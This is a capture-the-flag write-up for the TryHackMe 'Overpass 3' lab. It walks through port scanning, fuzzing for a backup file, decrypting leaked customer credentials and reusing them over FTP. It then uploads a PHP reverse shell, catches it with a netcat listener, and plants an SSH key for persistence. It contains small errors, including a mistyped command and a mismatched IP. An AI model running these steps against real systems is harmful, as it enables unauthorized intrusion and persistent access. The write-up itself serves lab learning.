# TryHackMe Overpass 3 hosting WriteUp
Machine IP = 10.82.158.10  

At first, I make a rust scan to find open ports:  

```bash  
rustscan -a 192.16.13.53
```  
Yeah, we defined that there are three ports:  
--> 21,22,80  
I searched the web-page and there were some usernames a hint on source code but nothing else. So I made a directory scanning by the help of **FFUF**.  
```bash
ffuf -u 'http://10.82.158.10/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -ic
```
It found some directories but there is only one necessary file for us: ***backup***  
I contains a ".zip" file. I clicked on it and it automatically installed to my device. Let's look what is inside it.  
```bash
unzip backup.zip  
|CustomerDetails.xlsx.gpg  
|priv.key  
gpg --import priv.key  
gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx  
```  
I opened this ".xlsx" file on browser by the help of online excel. It gave me three users and their credentials like username and password. As you can remember, we have an open ftp port. I tried to access with these user's name and password. Only the user "paradox" became successful for ftp connection.  

----  
  After successfully logging into the FTP server, the first idea is to upload a PHP reverse shell to gain remote access. I used the "reverse shell php" from pentestmonkey.  
```bash
ftp> put reverseshell.php
```
I opened a nc connection on my terminal by writing **"rlwrap nc -nvlp 4444"** and access to this url to get shell:
```bash
| http://10.82.158.10/reverseshell.php
```  
I am "apache" right now. I need to find web flag at first. So, I used this command to find its location:  
```bash  
find / -type f -name *.flag 2>/dev/null
```
The result is **"/usr/share/httpd/web.flag"**. I got it. Lets try access to other users. I tried it by ssh but none of them worked. So I decided to check su command for it. And again, we can access "paradox" user. I need better interface so i used "python3 -c 'import pty;pty.spawn("/bin/bash")'" command for it. A reverse shell is often unstable. To establish a persistent and stable SSH session, we generate SSH key pairs on our local machine and transfer the public key to the target. I use this command on my terminal:
```bash
sss-keygen
```
I copied the public key's content and paste it on "/home/paradox/.ssh/authorized_keys". After this I can easily connect to this user over ssh. 
```bash
ssh -i id_ed25519 paradox@10.82.158.10
```
I used the private key in there.  






























